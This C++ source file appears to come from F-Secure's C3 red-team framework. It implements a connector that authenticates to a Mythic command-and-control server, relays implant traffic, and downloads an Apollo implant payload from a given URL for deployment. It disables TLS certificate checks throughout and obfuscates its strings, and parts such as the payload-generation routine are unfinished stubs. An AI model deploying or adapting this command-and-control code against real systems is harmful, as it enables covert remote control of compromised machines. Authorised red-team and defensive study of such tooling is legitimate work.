#include "StdAfx.h"
#include "Common/json/json.hpp"
#include "Common/CppRestSdk/include/cpprest/http_client.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Structs.h"
#include <iostream>

using json = nlohmann::json;


namespace FSecure::C3::Interfaces::Connectors
{
	/// Class that mocks a Connector.
	class MythicServer : public Connector<MythicServer>
	{
	public:
		/// Constructor.
		/// @param arguments factory arguments.
		MythicServer(ByteView);

		/// Destructor
		virtual ~MythicServer() = default;

		/// OnCommandFromBinder callback implementation.
		/// @param binderId Identifier of Peripheral who sends the Command.
		/// @param command full Command with arguments.
		void OnCommandFromBinder(ByteView binderId, ByteView command) override;

		/// Returns json with Commands.
		/// @return Capability in JSON format
		static const char* GetCapability();

		/// Processes internal (C3 API) Command.
		/// @param command a buffer containing whole command and it's parameters.
		/// @return command result.
		ByteVector OnRunCommand(ByteView command) override;

		/// Called every time new implant is being created.
		/// @param connectionId unused.
		/// @param data unused. Prints debug information if not empty.
		/// @param isX64 unused.
		/// @returns ByteVector copy of data.
		ByteVector PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64) override;

		ByteVector GeneratePayload(ByteView binderId, std::string payloadUrl, std::string automaticExecution);

		std::string sendToMythic(std::string msg);

		void Send(ByteView data);

	private:
		/// Example of internal command of Connector. Must be described in GetCapability, and handled in OnRunCommand
		/// @param arg all arguments send to method.
		/// @returns ByteVector response for command.
		ByteVector TestErrorCommand(ByteView arg);

		/// Close desired connection
		/// @param connectionId id of connection (RouteId) in string form.
		/// @returns ByteVector empty vector.
		FSecure::ByteVector CloseConnection(ByteView connectionId) override;

				
		/// Represents a single connection with implant.
		struct Connection : std::enable_shared_from_this<Connection>
		{
			/// Constructor.
			/// @param owner weak pointer to connector object.
			/// @param id of connection.
			Connection(std::weak_ptr<MythicServer> owner, std::string_view id = ""sv);

			/// Creates the receiving thread.
			/// Thread will send packet every 3 seconds.
			void StartUpdatingInSeparateThread();

			/// Indicates that receiving thread was already started.
			/// @returns true if receiving thread was started, false otherwise.
			bool SecondThreadStarted();

			Messages::ConcurrentDictionary<std::string, std::shared_ptr<Messages::ChunkedMessageStore< Messages::ApolloIPCChunked>>> messageStore;
			int message_type;
			std::queue<std::string> messageQueue;

		private:
			/// Pointer to MythicServer.
			std::weak_ptr<MythicServer> m_Owner;

			/// RouteID in binary form.
			ByteVector m_Id;

			/// Indicates that receiving thread was already started.
			bool m_SecondThreadStarted = false;
		};

		/// Mythic bridge port
		std::string m_bridgeHost;

		/// Mythic host
		std::string m_webHost;

		///Mythic username
		std::string m_username;

		///Mythic password
		std::string m_password;

		///API token, generated on logon.
		std::string m_token;
		
		/// Access blocker for m_ConnectionMap.
		std::mutex m_ConnectionMapAccess;

		/// Map of all connections.
		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
	};
}

bool FSecure::C3::Interfaces::Connectors::MythicServer::Connection::SecondThreadStarted()
{
	return m_SecondThreadStarted;
}
//FSecure::ByteView sendToMythic(std::string msg)
std::string FSecure::C3::Interfaces::Connectors::MythicServer::sendToMythic(std::string msg)
{
	web::http::client::http_client_config config;
	pplx::task<web::http::http_response> task;
	web::http::http_response response;
	web::uri_builder uri;
	std::string data;
	std::string url = this->m_bridgeHost + OBF("/data");

	config.set_validate_certificates(false);
	web::http::http_request request(web::http::methods::POST);
	request.set_body(utility::conversions::to_string_t(msg));
	web::http::client::http_client client(utility::conversions::to_string_t(url), config);

	try
	{
		task = client.request(request);
		response = task.get();
		if (web::http::status_codes::OK != response.status_code())
			throw std::runtime_error("Something went wrong");
		auto respData = response.extract_utf8string(true);
		data = respData.get();
	}
	catch (std::exception& e)
	{
		std::cout << e.what() << std::endl;
	}
	catch (...)
	{
	}

	return data;
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::MythicServer::MythicServer(ByteView arguments)
{
	json postData;
	json response;

	std::tie(m_bridgeHost, m_webHost, m_username, m_password) = arguments.Read<std::string, std::string, std::string, std::string>();

	// if the last character is '/' remove it
	if (this->m_webHost.back() == '/')
		this->m_webHost.pop_back();

	// Authenticat
	std::string url = this->m_webHost + OBF("/auth");
	postData[OBF("username")] = this->m_username;
	postData[OBF("password")] = this->m_password;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false);

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request(web::http::methods::POST);
	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.set_body(utility::conversions::to_string_t(postData.dump()));

	pplx::task<web::http::http_response> task = webClient.request(request);
	web::http::http_response resp = task.get();

	if (resp.status_code() == web::http::status_codes::OK)
	{
		auto respData = resp.extract_string();
		response = json::parse(respData.get());
		this->m_token = response[OBF("access_token")].get<std::string>();
	}
	else {
		throw std::exception((OBF("[Mythic] Error authenticating, resp: ") + std::to_string(resp.status_code())).c_str());
	}		

}

void FSecure::C3::Interfaces::Connectors::MythicServer::Send(ByteView data)
{
	/*auto message = std::string(data);
	json msg = json::parse(message);*/

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::MythicServer::OnCommandFromBinder(ByteView binderId, ByteView command)
{
	std::scoped_lock<std::mutex> lock(m_ConnectionMapAccess);

	auto it = m_ConnectionMap.find(binderId);
	/*if (it == m_ConnectionMap.end())
	{
		it = m_ConnectionMap.emplace(binderId, std::make_unique<Connection>(std::static_pointer_cast<MythicServer>(shared_from_this()), binderId)).first;
		it->second->StartUpdatingInSeparateThread();
	}*/
	if (it == m_ConnectionMap.end())
		throw std::runtime_error{ OBF("Unknown connection") };

	if (!(it->second->SecondThreadStarted()))
		it->second->StartUpdatingInSeparateThread();

	//
	auto message = std::string(command);
	std::string resp = this->sendToMythic(message);
	
	it->second->messageQueue.push(resp);


	Log({ OBF("MythicServer received message"), LogMessage::Severity::DebugInformation });
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::MythicServer::Connection::Connection(std::weak_ptr<MythicServer> owner, std::string_view id)
	: m_Owner(owner)
	, m_Id(ByteView{ id })
{
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::MythicServer::Connection::StartUpdatingInSeparateThread()
{
	m_SecondThreadStarted = true;
	std::thread([&, id = m_Id]()
		{
			// Lock pointers.
			auto owner = m_Owner.lock();
			auto bridge = owner->GetBridge();
			auto self = shared_from_this();
			while (bridge->IsAlive() && self.use_count() > 1)
			{
				// Post something to Binder and wait a little.
				try
				{
					if (self->messageQueue.size() > 0) {
						std::string message = self->messageQueue.front();
						std::string_view strView(message);
						self->messageQueue.pop();
						bridge->PostCommandToBinder(id, ByteView(strView));
					}
				}
				catch (...)
				{
				}
				std::this_thread::sleep_for(3s);
			}
		}).detach();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return TestErrorCommand(command);
	case 1:
		return CloseConnection(command);
	default:
		return AbstractConnector::OnRunCommand(commandCopy);
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::CloseConnection(ByteView arguments)
{
	m_ConnectionMap.erase(arguments);
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::TestErrorCommand(ByteView arg)
{
	GetBridge()->SetErrorStatus(arg.Read<std::string>());
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void Generate() 
{
	// TODO: Complete autoamted payload generation
	//std::string authHeader = OBF("Bearer ") + this->m_token;
	std::string authHeader = OBF("Bearer ");
	std::string contentHeader = OBF("Content-Type: application/json");

	web::http::client::http_client_config config;
	config.set_validate_certificates(false);

	web::http::http_request request;
	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));

	json variables;
	variables[OBF("payload")][OBF("selected_os")] = OBF("Windows");
	variables[OBF("payload")][OBF("payload_type")] = OBF("apollo");
	variables[OBF("payload")][OBF("filename")] = OBF("Apollo_C3_Generated");
	variables[OBF("payload")][OBF("description")] = OBF("This payload was issued by C3");
	variables[OBF("payload")][OBF("commands")] = OBF("This payload was issued by C3");
	variables[OBF("payload")][OBF("build_parameters")] = OBF("This payload was issued by C3");
	variables[OBF("payload")][OBF("c2_profiles")] = OBF("This payload was issued by C3");

	json postData;
	postData[OBF("operationName")] = OBF("createPayloadMutation");
	postData[OBF("variables")] = variables;
	postData[OBF("query")] = OBF("createPayloadMutation");


}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::GeneratePayload(ByteView binderId, std::string payloadUrl, std::string automaticExecution)
{
	if(binderId.empty())
		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };

	// Add case for manual execution
	if ("false" == automaticExecution)
	{
		auto connection = std::make_shared<Connection>(std::static_pointer_cast<MythicServer>(shared_from_this()), binderId);

		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
		return ByteVector();
	}

	// Download the payload
	web::http::client::http_client_config config;
	config.set_validate_certificates(false);
	web::http::http_request request;
	pplx::task<web::http::http_response> task;
	web::http::http_response resp;

	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.set_method(web::http::methods::GET);
	web::http::client::http_client client(utility::conversions::to_string_t(payloadUrl), config);

	task = client.request(request);
	resp = task.get();
	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[Mythic] Error downloading payload, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
	auto respData = resp.extract_vector();
	auto payload = respData.get();

	auto connection = std::make_shared<Connection>(std::static_pointer_cast<MythicServer>(shared_from_this()), binderId);

	m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
	
	return payload;
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
{
	/*if (!data.empty())
		Log({ OBF("Non empty command for mock peripheral indicating parsing during command creation."), LogMessage::Severity::DebugInformation });*/
	auto [automaticExecution, pipeName, connectAttempts, payloadUrl] = data.Read<std::string, std::string, uint32_t, std::string>();


	return ByteVector{}.Write(pipeName, connectAttempts, automaticExecution, GeneratePayload(connectionId, payloadUrl, automaticExecution));
	//return data;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Connectors::MythicServer::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "string",
				"name": "Mythic C3 Prfoile endpoint",
				"min": 1,
				"defaultValue": "http://mythic:8000/",
				"description": "Mythic C3 profile listening endpoint - eg http://127.0.0.1:8000/"
			},
			{
				"type": "string",
				"name": "Mythic Web Host",
				"min": 1,
				"defaultValue": "https://mythic:7443/",
				"description": "Mythic admin endpoint - eg https://127.0.0.1:7443/"
			},
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "Username to authenticate"
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "Password to authenticate"
			}
		]
	},
	"commands":
	[
		{
			"name": "Test command",
			"description": "Set error on connector.",
			"id": 0,
			"arguments":
			[
				{
					"name": "Error message",
					"description": "Error set on connector. Send empty to clean up error"
				}
			]
		},
		{
			"name": "Close connection",
			"description": "Close socket connection with TeamServer if beacon is not available",
			"id": 1,
			"arguments":
			[
				{
					"name": "Route Id",
					"min": 1,
					"description": "Id associated to beacon"
				}
			]
		}
    ]
}
)";
}
